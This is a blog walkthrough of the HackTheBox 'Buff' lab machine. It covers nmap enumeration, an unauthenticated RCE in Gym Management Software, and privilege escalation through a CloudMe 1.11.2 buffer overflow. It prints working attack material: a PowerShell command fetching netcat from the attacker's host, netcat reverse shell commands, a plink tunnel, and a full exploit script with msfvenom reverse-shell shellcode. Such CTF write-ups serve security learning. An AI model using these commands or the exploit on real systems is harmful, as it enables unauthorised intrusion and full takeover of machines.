---
layout: post
title: HackTheBox Buff walkthrough
gh-repo: c00rni/c00rni.github.io
gh-badge: [star, fork, follow]
tags: [enumeration, hackthebox, netcat, plink, powershell, windows, msfvenom]
comments: true
---

Buff is a machine on [HackTheBox](https://www.hackthebox.eu/) platform with the IP address 10.10.10.198. The machine is vulnerable to multiple CVE which are easy to find. The machine has been rated Easy by the community. When I wrote this walkthrough, Buff wasn't retired yet. Please don't cheat and solve the box by yourself if you didn't get root flag. The purpose of HacktTheBox is to learn and trying by yourself is the best way to do it.

![info_cart.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/3da2ee768f774733bb773b4d7ce5b828.png)


## Post scan
Well, it started with several nmap scan to enumerate ports.


![fast_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8339a19328d74135ac616fd838f2a1ca.png)

I browser to the HTTP proxy and did a full TCP port scan in the background in case I've been missing something important.



![full_nmap.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/547e0902b8a04e2ca0c3a96acaa966fe.png)


Did a last scan to enumerate the version of the services I found.



![detail_nmap.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/348e061499bc40cc8f40b2e155662970.png)


![index_page.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/47b1d92d2c4d4785b3d3f9b5002627d4.png)

The first thing I tried to find were the technologies they used and their versions so I can search for CVE later. What does the application do? What language is it written in? What server software is the application running on? Do they use a CMS ?

Most of those questions were answered by poking around.

![contact_page.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/2e368b62d2cf4caebe60de2e5b9ec0a3.png)


![inspectorpng.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/155c34a5c1714eb4a049befe3ff90dbe.png)

## Foothold

I googled "Gym management Software 1.0" for exploits and get an unauthenticated [Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/48506).

![shaun_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/6c57f1e511e74ee5ad430fe7597fe642.png)

Now I can execute command on the server as user Shaun but it's not really convenient because I don't have proper shell. Shaun is an unprivileged user and I need to get an Administrator account to fully control the machine. The next step would be to enumerate the machine to find a way to elevate my privilege but let's get a shell first.

### Upload files 

I created a python web server to extend the folder of the file I wanted to upload on the server.

![local_http_server.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/9e8822b28ea047eebc5fce2fbad00451.png)

Executed the command below to download the file from my machine with the right IP address.
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://YOUR_IP_ADDRESS:8000/nc.exe', 'C:\xampp\htdocs\gym\upload\nc.exe')
```
I upload the first version of Netcat on the server since this version has an option to execute commands.

### Reverse shell

Opened the port 1234 for incoming connection and execute `nc.exe X.X.X.X 1234 -e cmd.exe` with your ip address to establish the reverse shell connection.

![listen_1234.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/9d1a53b7cddc40cfb5c063c935153ec8.png)



### System Information gathering

Ok. So I'm logged in windows x64 machine as Shaun. Let's begin or research from Shaun home directory to see what's there

```cmd
c:\Users\shaun>dir *.txt or *.exe /s /b
...
c:\Users\shaun\Desktop\user.txt
...
c:\Users\shaun\Downloads\CloudMe_1112.exe                                   
```

The command `dir` is used to list files a directory in cmd process. I used the option below to list important files.
- *.txt or *.exe : search for text and executable banry files 
- /s : search recursivly 
- /b : display only the path

## Privilege escalation

I googled "CloudMe_1112.exe" and found this executable were vulnerable to buffer overflow. Since we are in a CTF game, this information probably lead to something...

The executable open the port 8888 on the loopback interface (127.0.0.1), unfortunately I couldn't access this port from my kali machine. I download the [lastest version of plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) which is the command line tool of putty and executed the command below to create a SSH tunnel and get access to the port 8888 from my machine.


`plink.exe -ssh -l kali -pw YOUR_PASSWORD -R YOUR_IP_ADDRESS:8888:127.0.0.1:8888 YOUR_IP_ADDRESS`

### Exploitation 

I downloaded a [POC from exploit-db](https://www.exploit-db.com/exploits/48389) and modified the payload. 

```python
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe YOUR_IP_ADDRESS 4444 -e cmd.exe' -b '\x00\x0A\x0D' -f python  -v payload <--- Command I used to create the payload 
payload = b"\xda\xd3\xd9\x74\x24\xf4\xba\x7a\xe7\x80\xb2\x5e"		#<--- Modified payload
payload += b"\x33\xc9\xb1\x3e\x83\xc6\x04\x31\x56\x14\x03\x56"
payload += b"\x6e\x05\x75\x4e\x66\x4b\x76\xaf\x76\x2c\xfe\x4a"
payload += b"\x47\x6c\x64\x1e\xf7\x5c\xee\x72\xfb\x17\xa2\x66"
payload += b"\x88\x5a\x6b\x88\x39\xd0\x4d\xa7\xba\x49\xad\xa6"
payload += b"\x38\x90\xe2\x08\x01\x5b\xf7\x49\x46\x86\xfa\x18"
payload += b"\x1f\xcc\xa9\x8c\x14\x98\x71\x26\x66\x0c\xf2\xdb"
payload += b"\x3e\x2f\xd3\x4d\x35\x76\xf3\x6c\x9a\x02\xba\x76"
payload += b"\xff\x2f\x74\x0c\xcb\xc4\x87\xc4\x02\x24\x2b\x29"
payload += b"\xab\xd7\x35\x6d\x0b\x08\x40\x87\x68\xb5\x53\x5c"
payload += b"\x13\x61\xd1\x47\xb3\xe2\x41\xac\x42\x26\x17\x27"
payload += b"\x48\x83\x53\x6f\x4c\x12\xb7\x1b\x68\x9f\x36\xcc"
payload += b"\xf9\xdb\x1c\xc8\xa2\xb8\x3d\x49\x0e\x6e\x41\x89"
payload += b"\xf1\xcf\xe7\xc1\x1f\x1b\x9a\x8b\x75\xda\x28\xb6"
payload += b"\x3b\xdc\x32\xb9\x6b\xb5\x03\x32\xe4\xc2\x9b\x91"
payload += b"\x41\x3c\xd6\xb8\xe3\xd5\xbf\x28\xb6\xbb\x3f\x87"
payload += b"\xf4\xc5\xc3\x22\x84\x31\xdb\x46\x81\x7e\x5b\xba"
payload += b"\xfb\xef\x0e\xbc\xa8\x10\x1b\xff\x74\xb3\xdc\x61"
payload += b"\xe5\x3b\x6d\x3e\x9d\xcf\xe9\xd1\x3e\x43\xae\x4a"
payload += b"\xb9\xce\x12\xe0\x49\x7d\xc4\x6b\xcd\x21\x74\x0f"
payload += b"\x23\xbf\xf0\xaa\x1b\x0e\x31\x1b\x6a\x40\x1f\x52"
payload += b"\xb8\x8e\x66\xb4\xf4\xfa\xac\x80\xd4\x2f\xa8\xc8"
payload += b"\x77\x5d\x56\x27\x12\xe5\xf3\x37"
overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
```

I executed it and got a shell as Administrator.


![root_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/c2ee9ee649634840b89d70f9ca4b2ccd.png)

And that’s how I did Buff. This is my first walkthrough, others will be coming soon. I hope you learn something. See you till the next write up.

